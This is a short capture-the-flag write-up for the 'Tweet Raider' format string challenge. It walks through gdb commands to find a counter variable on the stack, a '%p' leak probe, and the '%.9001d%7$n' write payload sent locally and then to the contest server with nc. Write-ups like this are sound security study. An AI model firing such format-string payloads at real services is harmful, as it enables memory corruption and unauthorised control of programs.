# Tweet Raider

This was a simple format string pwnable that involved overwriting an integer whose point is stored on the stack.

We start by setting up a breakpoint so we can check where counter variable is on stack:

```gdb
pie break *0xe62
pie run
```

We then overwrite the initial contents of this variable so we can easily leak it in format string:

```gdb
# Address changes based on malloc return value.
nexti
set {long}0x00005555557572a0 = 0x4242424242424242
```

The above snippet turns out to be unnecessary, but I'm keeping it as a reference for future use.

Running and entering the format string `AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p` shows us that our format string is the 8th argument on the stack, and the address of the counter variable immediately preceds it as the 7th argument on the stack.

We must overwrite the value stored at this location on the stack with our desired counter value (over 9000). So, we can use the following to overwrite the 7th argument on the stack with a value of over 9000:

```sh
echo '%.9001d%7$n' | ./tweet-raider
```

Now, we just need to fire it at the remote target:

```sh
echo '%.9001d%7$n' | nc pwn.ctf.b01lers.com 1004
```
